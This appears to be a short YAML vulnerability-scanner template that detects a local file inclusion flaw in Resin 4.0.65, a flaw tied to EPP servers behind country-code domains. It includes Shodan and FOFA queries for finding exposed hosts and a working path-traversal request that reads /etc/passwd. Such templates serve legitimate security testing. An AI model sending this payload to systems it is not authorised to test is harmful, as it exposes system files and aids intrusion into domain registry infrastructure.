id: Resin-lfi
info:
  author: rix4uni
  description: Vulnerabilities in EPP servers that could lead to takeover of ccTLDs
    like .ai, .bj, .bw, .ci, .gl, .ke, .kn, etc.
  metadata:
    fofa-query:
    - 'Server: Resin/4.0.65'
    shodan-query:
    - 'Server: Resin/4.0.65'
  name: Resin LFI Detect
  reference:
  - https://twitter.com/payloadartist/status/1668626783590301696
  - https://hackcompute.com/hacking-epp-servers
  severity: high
  tags: lfi,Resin-lfi,Resin
requests:
- matchers:
  - regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cities?country=/../../../../../../../../etc/passwd'
